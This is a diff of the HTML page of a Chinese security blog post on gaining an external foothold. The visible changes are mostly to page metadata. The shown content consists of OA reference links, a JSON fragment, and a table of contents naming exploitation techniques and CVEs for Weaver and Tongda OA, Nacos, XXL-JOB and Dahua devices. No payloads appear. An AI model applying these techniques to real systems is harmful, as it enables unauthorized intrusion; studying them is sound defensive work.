@@ -1,5 +1,5 @@
-<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"/><meta name="theme-color" content="#222"/><meta http-equiv="X-UA-COMPATIBLE" content="IE=edge,chrome=1"/><meta name="renderer" content="webkit"/><link rel="icon" type="image/ico" sizes="32x32" href="/assets/favicon.ico"/><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"/><link rel="alternate" href="/rss.xml" title="欢迎来到ZLARYY的个人博客，或许里面有什么好玩的东西~" type="application/rss+xml"><link rel="alternate" href="/atom.xml" title="欢迎来到ZLARYY的个人博客，或许里面有什么好玩的东西~" type="application/atom+xml"><link rel="alternate" type="application/json" title="欢迎来到ZLARYY的个人博客，或许里面有什么好玩的东西~" href="https://zlaryy.top/feed.json"/><link rel="preconnect" href="https://s4.zstatic.net"/><link rel="preconnect" href="https://at.alicdn.com"/><link rel="modulepreload" href="/js/siteInit.js"></link><link rel="modulepreload" href="/js/nyx-player-HIXTN7KD.js"></link><link rel="modulepreload" href="/js/copy-tex-4AIDXWNJ.js"></link><link rel="modulepreload" href="/js/post-MYXPIC3N.js"></link><link rel="modulepreload" href="/js/chunk-T54OBHW4.js"></link><link rel="modulepreload" href="/js/index.esm-22UB7CNZ.js"></link><link rel="modulepreload" href="/js/chunk-HJSTZ4VX.js"></link><link rel="modulepreload" href="/js/chunk-ALXQBZTY.js"></link><link rel="stylesheet" href="/css/siteInit.css" media="none" onload="this.media&#x3D;&#39;all&#39;"></link><link rel="preload" href="/assets/picture3.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture2.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture1.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture5.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture5.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture1.webp" as="image" fetchpriority="high"><meta name="keywords" content="Web安全"/><meta name="description" content="Web安全 / CTF / 个人学习笔记"/><link rel="canonical" href="https://zlaryy.top/2026/08/17/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9-PART3/"><link rel="stylesheet" href="/css/post.css?v=0.5.4"><link rel="stylesheet" href="/css/mermaid.css?v=0.5.4"><!-- 临时处理--><link rel="stylesheet" media="none" onload="this.media='all'" href="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.css"><title>常规外网打点-PART3</title><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css">
-<link rel="stylesheet" href="/css/custom.css"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="pagefind_mount"></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">常规外网打点-PART3</h1><div class="meta"><span class="item" title="创建时间：2026-08-17 18:10:00"><span class="icon"><i class="ic i-calendar"></i></span><span class="text">发表于</span><time itemprop="dateCreated datePublished" datetime="2026-08-17T18:10:00+08:00">2026-08-17</time></span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i></span><span class="text">本文字数</span><span>47k</span><span class="text">字</span></span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i></span><span class="text">阅读时长</span><span>43 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span><span class="line"></span><span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">ZLARYY</a></li></ul><ul class="right" id="rightNav"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div class="pjax" id="imgs"><ul><li class="item" style="background-image: url(&quot;/assets/picture3.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture2.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture1.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture5.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture5.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture1.webp&quot;);"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"></use><use xlink:href="#gentle-wave" x="48" y="3"></use><use xlink:href="#gentle-wave" x="48" y="5"></use><use xlink:href="#gentle-wave" x="48" y="7"></use></g></svg></div><main><div class="inner"><div class="pjax" id="main"><div class="article wrap"><div class="breadcrumb" itemListElement itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i><span><a href="/">首页</a></span></div><article class="post block" itemscope="itemscope" itemtype="http://schema.org/Article" data-pagefind-body="data-pagefind-body" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://zlaryy.top/2026/08/17/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9-PART3/"/><span hidden="hidden" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="image" content="/assets/avertar.png"/><meta itemprop="name" content="ZLARYY"/><meta itemprop="description" content=", Web安全 / CTF / 个人学习笔记"/></span><span hidden="hidden" itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="欢迎来到ZLARYY的个人博客，或许里面有什么好玩的东西~"/></span><div class="body md" itemprop="articleBody"><h1 id="常规外网打点-part3持续更新中"><a class="anchor" href="#常规外网打点-part3持续更新中">#</a> 常规外网打点-PART3（持续更新中......）</h1>
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"/><meta name="theme-color" content="#222"/><meta http-equiv="X-UA-COMPATIBLE" content="IE=edge,chrome=1"/><meta name="renderer" content="webkit"/><link rel="icon" type="image/ico" sizes="32x32" href="/assets/favicon.ico"/><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"/><link rel="alternate" href="/rss.xml" title="欢迎来到ZLARYY的个人博客，或许里面有什么好玩的东西~" type="application/rss+xml"><link rel="alternate" href="/atom.xml" title="欢迎来到ZLARYY的个人博客，或许里面有什么好玩的东西~" type="application/atom+xml"><link rel="alternate" type="application/json" title="欢迎来到ZLARYY的个人博客，或许里面有什么好玩的东西~" href="https://zlaryy.top/feed.json"/><link rel="preconnect" href="https://s4.zstatic.net"/><link rel="preconnect" href="https://at.alicdn.com"/><link rel="modulepreload" href="/js/siteInit.js"></link><link rel="modulepreload" href="/js/nyx-player-HIXTN7KD.js"></link><link rel="modulepreload" href="/js/copy-tex-4AIDXWNJ.js"></link><link rel="modulepreload" href="/js/post-MYXPIC3N.js"></link><link rel="modulepreload" href="/js/chunk-T54OBHW4.js"></link><link rel="modulepreload" href="/js/index.esm-22UB7CNZ.js"></link><link rel="modulepreload" href="/js/chunk-HJSTZ4VX.js"></link><link rel="modulepreload" href="/js/chunk-ALXQBZTY.js"></link><link rel="stylesheet" href="/css/siteInit.css" media="none" onload="this.media&#x3D;&#39;all&#39;"></link><link rel="preload" href="/assets/picture3.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture1.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture4.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture4.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture2.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture6.webp" as="image" fetchpriority="high"><meta name="keywords" content="Web安全"/><meta name="description" content="Web安全 / CTF / 个人学习笔记"/><link rel="canonical" href="https://zlaryy.top/2026/08/17/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9-PART3/"><link rel="stylesheet" href="/css/post.css?v=0.5.4"><link rel="stylesheet" href="/css/mermaid.css?v=0.5.4"><!-- 临时处理--><link rel="stylesheet" media="none" onload="this.media='all'" href="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.css"><title>常规外网打点-PART3</title><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css">
+<link rel="stylesheet" href="/css/custom.css"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="pagefind_mount"></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">常规外网打点-PART3</h1><div class="meta"><span class="item" title="创建时间：2026-08-17 18:10:00"><span class="icon"><i class="ic i-calendar"></i></span><span class="text">发表于</span><time itemprop="dateCreated datePublished" datetime="2026-08-17T18:10:00+08:00">2026-08-17</time></span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i></span><span class="text">本文字数</span><span>54k</span><span class="text">字</span></span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i></span><span class="text">阅读时长</span><span>49 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span><span class="line"></span><span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">ZLARYY</a></li></ul><ul class="right" id="rightNav"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div class="pjax" id="imgs"><ul><li class="item" style="background-image: url(&quot;/assets/picture3.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture1.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture4.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture4.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture2.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture6.webp&quot;);"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"></use><use xlink:href="#gentle-wave" x="48" y="3"></use><use xlink:href="#gentle-wave" x="48" y="5"></use><use xlink:href="#gentle-wave" x="48" y="7"></use></g></svg></div><main><div class="inner"><div class="pjax" id="main"><div class="article wrap"><div class="breadcrumb" itemListElement itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i><span><a href="/">首页</a></span></div><article class="post block" itemscope="itemscope" itemtype="http://schema.org/Article" data-pagefind-body="data-pagefind-body" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://zlaryy.top/2026/08/17/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9-PART3/"/><span hidden="hidden" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="image" content="/assets/avertar.png"/><meta itemprop="name" content="ZLARYY"/><meta itemprop="description" content=", Web安全 / CTF / 个人学习笔记"/></span><span hidden="hidden" itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="欢迎来到ZLARYY的个人博客，或许里面有什么好玩的东西~"/></span><div class="body md" itemprop="articleBody"><h1 id="常规外网打点-part3持续更新中"><a class="anchor" href="#常规外网打点-part3持续更新中">#</a> 常规外网打点-PART3（持续更新中......）</h1>
 <h1 id="oa"><a class="anchor" href="#oa">#</a> OA</h1>
 <p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/2401_82616673/article/details/142483917">活久见，竟然有人不知道OA是什么，我来给你扫盲吧！-CSDN博客</a></p>
 <p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/714301946">初入职场第1名词:OA - 知乎</a></p>
@@ -1060,7 +1060,301 @@
 <span class="line"><span>			"requestIp": ""</span></span>
 <span class="line"><span>			&#125;</span></span>
 <span class="line"><span>&#125;</span></span></code></pre>
-</div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i></span><span class="text">更新于 </span><time title="修改时间：2026-08-18 23:40:47" itemprop="dateModified" datetime="2026-08-18T23:40:47+08:00">2026-08-18</time></span></div><div id="copyright"><ul><li class="author"><strong>本文作者：</strong>ZLARYY<i class="ic i-at"><em>@</em></i>欢迎来到ZLARYY的个人博客，或许里面有什么好玩的东西~</li><li class="link"><strong>本文链接：</strong><a href="https://zlaryy.top/2026/08/17/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9-PART3/" title="常规外网打点-PART3">https://zlaryy.top/2026/08/17/常规外网打点-PART3/</a></li><li class="license"><strong>版权声明：</strong>本站所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2026/08/04/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9-PART2/" rel="prev" itemprop="url" data-background-image="&#x2F;assets&#x2F;picture5.webp" title="常规外网打点-PART2"><span class="type">上一篇</span><h3>常规外网打点-PART2</h3></a></div><div class="item right"></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9-part3%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD"><span class="toc-number">1.</span> <span class="toc-text"> 常规外网打点-PART3（持续更新中......）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#oa"><span class="toc-number">2.</span> <span class="toc-text"> OA</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%9B%E5%BE%AEoa"><span class="toc-number">2.1.</span> <span class="toc-text"> 泛微OA</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="toc-number">2.1.1.</span> <span class="toc-text"> 指纹识别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.1.2.</span> <span class="toc-text"> 文件上传漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.1.3.</span> <span class="toc-text"> SQL注入漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%85%A8%E7%89%88%E6%9C%AC%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE"><span class="toc-number">2.1.4.</span> <span class="toc-text"> 未授权访问漏洞（全版本默认配置）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.1.5.</span> <span class="toc-text"> 命令注入漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.1.6.</span> <span class="toc-text"> Hessian反序列化漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BE%BEoa"><span class="toc-number">2.2.</span> <span class="toc-text"> 通达OA</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8E%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.2.1.</span> <span class="toc-text"> 文件上传与包含漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-2"><span class="toc-number">2.2.2.</span> <span class="toc-text"> SQL注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#id%E5%8F%82%E6%95%B0%E5%AD%98%E5%9C%A8sqli%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.2.1.</span> <span class="toc-text"> id参数存在sqli注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#starttime%E5%8F%82%E6%95%B0"><span class="toc-number">2.2.2.2.</span> <span class="toc-text"> starttime参数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#orderby%E5%8F%82%E6%95%B0"><span class="toc-number">2.2.2.3.</span> <span class="toc-text"> orderby参数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#down%E6%8E%A5%E5%8F%A3%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">2.2.3.</span> <span class="toc-text"> down接口信息泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#video_filephp%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.2.4.</span> <span class="toc-text"> video_file.php任意文件下载漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get_contactlistphp"><span class="toc-number">2.2.5.</span> <span class="toc-text"> get_contactlist.php</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%86%85%E7%BD%91web%E6%9C%8D%E5%8A%A1"><span class="toc-number">3.</span> <span class="toc-text"> 常见内网web服务</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#nacos"><span class="toc-number">3.1.</span> <span class="toc-text"> Nacos</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96nacos%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">3.1.1.</span> <span class="toc-text"> 获取nacos版本信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4"><span class="toc-number">3.1.2.</span> <span class="toc-text"> 默认口令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4%E6%9C%AA%E5%BC%80%E5%90%AF%E9%89%B4%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%9F%A5%E7%9C%8B%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF"><span class="toc-number">3.1.3.</span> <span class="toc-text"> 默认未开启鉴权-未授权查看用户信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#user-agent%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87cve-2021-29441"><span class="toc-number">3.1.4.</span> <span class="toc-text"> User-Agent权限绕过（CVE-2021-29441）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4jwt%E5%AF%86%E9%92%A5-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">3.1.5.</span> <span class="toc-text"> 默认JWT密钥-未授权访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#derby%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">3.1.6.</span> <span class="toc-text"> Derby未授权访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nacos-client-yaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.1.7.</span> <span class="toc-text"> Nacos Client Yaml反序列化漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nacos-hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.1.8.</span> <span class="toc-text"> Nacos Hessian反序列化漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nacos-rce"><span class="toc-number">3.1.9.</span> <span class="toc-text"> Nacos RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3"><span class="toc-number">3.1.10.</span> <span class="toc-text"> 密码破解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#nacos%E5%AF%86%E7%A0%81bcypt"><span class="toc-number">3.1.10.1.</span> <span class="toc-text"> nacos密码bcypt</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%AF%86%E6%96%87jasypt"><span class="toc-number">3.1.10.2.</span> <span class="toc-text"> 配置文件密文jasypt</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">3.1.11.</span> <span class="toc-text"> 常用命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xxl-job"><span class="toc-number">3.2.</span> <span class="toc-text"> XXL-JOB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4-2"><span class="toc-number">3.2.1.</span> <span class="toc-text"> 默认口令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">3.2.2.</span> <span class="toc-text"> Hessian反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8"><span class="toc-number">3.2.2.1.</span> <span class="toc-text"> 出网利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8"><span class="toc-number">3.2.2.2.</span> <span class="toc-text"> 不出网利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">3.2.3.</span> <span class="toc-text"> 后台命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#executor%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">3.2.4.</span> <span class="toc-text"> Executor未授权命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4accesstoken%E8%BA%AB%E4%BB%BD%E7%BB%95%E8%BF%87"><span class="toc-number">3.2.5.</span> <span class="toc-text"> 默认accessToken身份绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0ssrf"><span class="toc-number">3.2.6.</span> <span class="toc-text"> 后台SSRF</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%A7%E5%8D%8E"><span class="toc-number">3.3.</span> <span class="toc-text"> 大华</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%91%84%E5%83%8F%E5%A4%B4%E4%B8%8Envr%E8%AE%BE%E5%A4%87%E7%AB%AF%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.3.1.</span> <span class="toc-text"> 摄像头与NVR设备端漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9Ecve-2021-33044-cve-2021-33045"><span class="toc-number">3.3.1.1.</span> <span class="toc-text"> 身份验证绕过漏洞CVE-2021-33044 &amp; CVE-2021-33045</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#onvif%E5%8D%8F%E8%AE%AE%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87cve-2022-30563"><span class="toc-number">3.3.1.2.</span> <span class="toc-text"> ONVIF协议认证绕过CVE-2022-30563</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">3.3.2.</span> <span class="toc-text"> 任意文件上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-number">3.3.3.</span> <span class="toc-text"> SQL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.3.4.</span> <span class="toc-text"> 任意文件读取漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">3.3.5.</span> <span class="toc-text"> 未授权命令执行</span></a></li></ol></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><img class="image" loading="lazy" decoding="async" itemprop="image" alt="ZLARYY" src="/assets/avertar.png"/><p class="name" itemprop="name">ZLARYY</p><div class="description" itemprop="description">Web安全 / CTF / 个人学习笔记</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">19</span><span class="name">文章</span></a></div></nav><div class="social"><a target="_blank" rel="noopener" href="https://github.com/ZLARYY123" class="item github" title="https:&#x2F;&#x2F;github.com&#x2F;ZLARYY123"><i class="ic i-github"></i></a></div><div class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>友链</a></li><li class="item"><a href="/essay/" rel="section"><i class="ic i-calendar"></i>essay</a></li></div></div></div></div><ul id="quick"><li class="prev pjax"></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2026/08/04/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9-PART2/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div><div id="player"></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"></div><span><a href="/2026/06/18/SQL%E6%8F%90%E6%9D%83/">SQL提权</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/04/07/XXE/">XXE</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/02/12/SSRF/">SSRF</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/02/22/SQL/">SQL</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/02/28/RCE/">RCE</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/03/20/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8EPython%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">Pickle反序列化与Python原型链污染</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/07/24/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">Node.js原型链污染</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/05/29/%E5%85%B6%E4%BB%96%E7%B3%BB%E7%BB%9F%E5%BA%93%E7%B1%BB%E5%9E%8B%E4%B8%8B%E7%9A%84SQL%E6%B3%A8%E5%85%A5/">其他系统库类型下的SQL注入</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/05/19/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9-PART1/">常规外网打点-PART1</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/04/02/flask%20session%E4%BC%AA%E9%80%A0%E4%B8%8Efilter-chain/">flask的session伪造与filter-chain</a></span></li></ul></div><div class="rpost pjax"><h2>最新评论</h2></div></div><div class="status"><div class="copyright">&copy; 2022 -<span itemprop="copyrightYear">2026</span><span 